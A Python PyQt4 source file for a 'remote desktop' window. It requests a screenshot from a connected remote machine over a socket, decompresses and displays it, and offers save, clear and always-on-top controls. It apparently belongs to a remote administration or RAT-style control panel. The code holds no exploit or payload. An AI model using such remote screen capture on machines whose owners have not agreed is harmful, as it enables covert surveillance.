from PyQt4.QtGui import *
from PyQt4.QtCore import *

import main_ui

from libs.modechat import get
from libs.language import Translate

import ast
import zlib
from PIL import Image, ImageQt

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class mainPopup(QWidget, main_ui.Ui_Form):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']

        self.setWindowTitle(_('MDESKTOP_TITLE'))

        self.saveButton.setDisabled(True)
        self.clearButton.setDisabled(True)

        self.screenshotButton.clicked.connect(self.get_screenshot)
        self.saveButton.clicked.connect(self.save_preview)
        self.clearButton.clicked.connect(self.clear_preview)
        self.alwaysTopButton.clicked.connect(self.always_top)

        # Translate
        self.screenshotButton.setText(_('MDESKTOP_CAPTURE'))
        self.saveButton.setText(_('MDESKTOP_SAVE'))
        self.clearButton.setText(_('MDESKTOP_CLEAR'))
        self.screenshotLabel.setText(_('MDESKTOP_INFO'))

    def get_screenshot(self):
        screen_dict = get(self.sock, 'getScreen', self.socket)
        try:
            screen_info = ast.literal_eval(screen_dict)
            im = Image.frombuffer('RGB', (int(screen_info['width']), int(screen_info['height'])),
                                  zlib.decompress(screen_info['screenshotbits']), 'raw', 'BGRX', 0, 1)
            screen_bits = im.convert('RGBA')
            self.screenshotLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(screen_bits)).scaled(
                    self.screenshotLabel.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation))
            self.current_bits = screen_bits
            self.saveButton.setDisabled(False)
            self.clearButton.setDisabled(False)
        except SyntaxError:
            pass

    def save_preview(self):
        if self.current_bits:
            file_name = QFileDialog.getSaveFileName(self, 'Save file', '', 'Image (*.png)')
            windows_path = str(file_name).replace('/', '\\')
            if file_name:
                self.current_bits.save(windows_path, 'png')
        else:
            self.saveButton.setDisabled(True)
            self.clearButton.setDisabled(True)

    def clear_preview(self):
        self.current_bits = None
        self.screenshotLabel.clear()
        self.saveButton.setDisabled(True)
        self.clearButton.setDisabled(True)

    def resizeEvent(self, event):
        if self.screenshotLabel.pixmap():
            self.screenshotLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(self.current_bits)).scaled(
                self.screenshotLabel.width(), self.screenshotLabel.height(), Qt.KeepAspectRatio, Qt.SmoothTransformation))

    def always_top(self):
        if self.alwaysTopButton.isChecked():
            self.setWindowFlags(self.windowFlags() | Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags() & ~Qt.WindowStaysOnTopHint)
            self.show()

